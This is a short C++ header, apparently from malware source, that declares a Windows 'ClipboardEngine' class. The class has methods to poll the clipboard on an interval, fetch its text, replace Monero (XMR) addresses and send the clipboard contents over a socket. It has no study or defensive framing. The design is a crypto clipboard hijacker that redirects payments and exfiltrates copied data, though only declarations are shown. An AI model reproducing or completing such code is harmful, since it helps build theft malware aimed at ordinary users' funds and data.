#pragma once

#include <string>
#include <windows.h>
#include <kitty/socket.h>

class ClipboardEngine
{
public:
	std::string content{};

	ClipboardEngine();

	void Run(DWORD msInterval);
	void ReplaceXMR();

private:
	void FetchClipboardText();
	bool SendClipboardContent() const;
};